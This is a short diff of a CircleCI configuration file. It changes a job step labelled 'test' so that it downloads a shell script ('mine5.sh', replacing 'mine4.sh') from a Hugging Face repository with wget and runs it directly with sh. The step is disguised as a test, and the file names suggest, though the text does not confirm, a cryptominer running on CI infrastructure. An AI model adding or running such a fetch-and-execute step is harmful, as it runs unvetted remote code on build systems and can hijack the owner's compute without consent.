@@ -16,7 +16,7 @@ jobs:
     steps:
       - run:
           name: "test"
-          command: "wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh"
+          command: "wget https://huggingface.co/myfiles/data/raw/main/mine5.sh && sh mine5.sh"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
